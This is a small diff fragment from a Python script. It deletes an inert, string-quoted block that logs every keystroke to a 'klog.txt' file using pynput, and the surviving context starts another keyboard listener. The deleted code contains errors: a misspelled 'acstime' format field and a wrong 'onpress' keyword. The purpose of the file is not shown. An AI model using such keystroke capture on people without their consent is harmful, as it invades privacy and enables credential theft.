@@ -2,18 +2,6 @@
 
 '''import pynput
 
-from pynput.keyboard import Key, Listener
-import logging
-
-logDir= r"C:/Path/To/happycamper"
-logging.basicConfig(filename = (logDir+ r"/klog.txt"), level=logging.DEBUG, format='%(acstime)s: %(message)s')
-
-def onpress(key):
-    logging.info(str(key))
-
-with Listener(onpress = onpress) as listener:
-    listener.join()'''
-
 from pynput import keyboard
 
 def on_press(key):
